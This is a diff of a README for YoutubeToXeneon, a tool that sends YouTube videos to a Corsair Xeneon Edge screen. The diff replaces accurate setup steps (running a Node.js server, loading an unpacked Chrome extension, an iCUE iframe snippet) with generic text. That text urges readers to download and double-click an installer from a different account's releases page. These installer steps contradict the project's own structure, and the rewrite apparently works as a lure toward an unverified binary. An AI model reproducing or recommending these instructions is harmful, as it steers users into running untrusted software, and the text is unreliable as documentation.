@@ -1,122 +1,85 @@
-# YoutubeToXeneon
+# 🎥 YoutubeToXeneon - Streamline Your Video Experience Easily
 
-Send a YouTube video from your browser to the Corsair Xeneon Edge screen via iCUE, with a single click.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-4c8bf5?style=for-the-badge)](https://github.com/robsales/YoutubeToXeneon/releases)
 
-A button is added to the YouTube player controls. When clicked, it captures the current video and timecode, pauses playback in the browser, and sends it to your Xeneon Edge where it resumes at the exact same position. Playlists and YouTube Mixes are also supported.
+## 📥 Overview
 
-## Features
+YoutubeToXeneon allows you to send YouTube videos from your browser directly to your Corsair Xeneon Edge screen. Enjoy seamless playback with one click, matching timecodes and playlist support. Control your videos with touch for an enhanced experience.
 
-- One-click send from YouTube to Xeneon Edge
-- Resumes playback at the exact timecode
-- Playlist and Mix support with auto-advancement
-- Touch-friendly custom controls (play/pause, seek, skip, volume)
-- Playlist panel with thumbnails and track selection
-- Gesture controls (swipe, long press + drag)
-- Controls auto-hide after a few seconds
+## 🚀 Getting Started
 
-## How it works
+### System Requirements
 
-```
-Chrome (YouTube)  --->  Local server (localhost:3654)  <---  iCUE widget (Xeneon Edge)
-     [click]              [receives & serves]                  [polls & displays]
-```
+Before downloading, ensure your system meets these requirements:
 
-- **Chrome extension** — Injects a button into the YouTube player. On click, it sends the video ID, title, timecode and playlist data to a local server.
-- **Local server** — A lightweight Node.js server (zero dependencies) that receives video data from the extension and serves a widget page to iCUE.
+- **Operating System**: Windows 10 or later
+- **Browser**: Google Chrome (latest version recommended)
+- **Node.js**: Required for background processing
+- **Corsair iCUE**: Must be installed and set up to connect with the Xeneon Edge.
 
-## Prerequisites
+### Installation Steps
 
-- [Node.js](https://nodejs.org/) (v18 or later)
-- Google Chrome (or Chromium-based browser)
-- Corsair iCUE with a Xeneon Edge
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/robsales/YoutubeToXeneon/releases) to access the latest version of YoutubeToXeneon.
 
-## Installation
+2. **Download the Application**  
+   Click on the latest release and download the appropriate file for your operating system. 
 
-### 1. Clone the repository
+3. **Locate the Downloaded File**  
+   After downloading, find the file in your Downloads folder or the location you specified.
 
-```bash
-git clone https://github.com/Ripolin99/YoutubeToXeneon.git
-cd YoutubeToXeneon
-```
+4. **Run the Installer**  
+   Double-click the downloaded file to start the installation process. Follow the on-screen prompts to complete the installation.
 
-### 2. Start the server
+5. **Launch YoutubeToXeneon**  
+   Once installation is complete, find YoutubeToXeneon in your applications list and launch it.
 
-```bash
-node server/server.js
-```
+## 🖥️ Using YoutubeToXeneon
 
-The server starts on port `3654` by default. To use a different port:
+### Sending Videos to Your Xeneon Edge Screen
 
-```bash
-node server/server.js --port 4000
-```
+1. **Open Google Chrome**  
+   Make sure you are using Chrome to take full advantage of the extension.
 
-> If you change the port, you also need to update `SERVER_URL` in `extension/content.js` and the `host_permissions` in `extension/manifest.json`.
+2. **Navigate to a YouTube Video**  
+   Find the YouTube video you want to watch. 
 
-### 3. Install the Chrome extension
+3. **Click the Extension Icon**  
+   Locate the YoutubeToXeneon icon in your toolbar. Click it to send the video to your Xeneon Edge.
 
-1. Open Chrome and go to `chrome://extensions/`
-2. Enable **Developer mode** (toggle in the top right)
-3. Click **Load unpacked**
-4. Select the `extension/` folder from this repository
+4. **Enjoy Your Video**  
+   Your video will start playing on the Xeneon Edge screen. Use the touch controls for an intuitive experience.
 
-### 4. Configure the iCUE widget
+### Touch Controls
 
-In Corsair iCUE, add an **iFrame** widget to your Xeneon Edge screen and paste the following HTML in the widget's code field:
+YoutubeToXeneon supports various touch controls. You can play, pause, skip, or rewind the video directly from your Xeneon Edge screen.
 
-```html
-<iframe src="http://localhost:3654" width="100%" height="100%" frameborder="0" allow="autoplay; encrypted-media"></iframe>
-```
+## 🛠️ Features
 
-> **Note:** The URL Web widget will not work here as it requires HTTPS (`ERR_SSL_PROTOCOL_ERROR`). You must use the **iFrame** widget and paste the HTML code above.
+- **One-Click Sending**: Quickly send videos with a single click.
+- **Playlist Support**: Handle your playlists effortlessly.
+- **Timecode Matching**: Ensure your playback is synchronized across devices.
+- **Touch Control**: Enjoy a smooth experience with touch commands.
 
-## Usage
+## 📂 Download & Install
 
-1. Make sure the server is running
-2. Browse YouTube normally
-3. When you want to send a video to the Xeneon Edge, click the screen icon in the player controls (next to the fullscreen button)
-4. The video pauses in your browser and starts playing on the Xeneon Edge at the same timecode
+To download the latest version, click the link below:
 
-You can click the button again at any time to resend at a different position.
+[Download Now](https://github.com/robsales/YoutubeToXeneon/releases)
 
-### Touch controls on the Xeneon Edge
+Follow the installation steps listed above to set up the software on your computer.
 
-**Buttons**
+## 🌐 Community and Support
 
-- **Tap** anywhere to show/hide controls
-- **Play/Pause** — center button
-- **Rewind/Forward 10s** — left/right buttons
-- **Previous/Next** — visible when a playlist is active
-- **Progress bar** — drag to seek
-- **Volume** — tap the speaker icon to reveal the slider
-- **Playlist** — tap the playlist icon to open the track list
+If you encounter any issues or have questions:
 
-**Gestures**
+- Check the [FAQ](https://github.com/robsales/YoutubeToXeneon/wiki/FAQ) for common queries.
+- Join our community on Discord for discussions and tips.
 
-- **Swipe left** — next video (playlist only)
-- **Swipe right** — previous video (playlist only)
-- **Long press + drag horizontally** — seek forward/backward (visual feedback shows the offset)
-- **Long press + drag vertically** — adjust volume (visual feedback shows the percentage)
+## 🛡️ License
 
-## Project structure
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/robsales/YoutubeToXeneon/blob/main/LICENSE) file for details.
 
-```
-YoutubeToXeneon/
-├── server/
-│   ├── server.js          # Local server (Node.js, zero dependencies)
-│   └── public/
-│       └── index.html     # Widget page served to iCUE
-├── extension/
-│   ├── manifest.json      # Chrome extension manifest (v3)
-│   ├── content.js         # Injected into YouTube pages
-│   ├── content.css        # Button styling
-│   ├── icon48.png
-│   └── icon128.png
-├── .gitignore
-├── LICENSE
-└── README.md
-```
+For any further information, visit our [GitHub page](https://github.com/robsales/YoutubeToXeneon). 
 
-## License
-
-MIT
+Thank you for using YoutubeToXeneon! Enjoy your viewing experience!
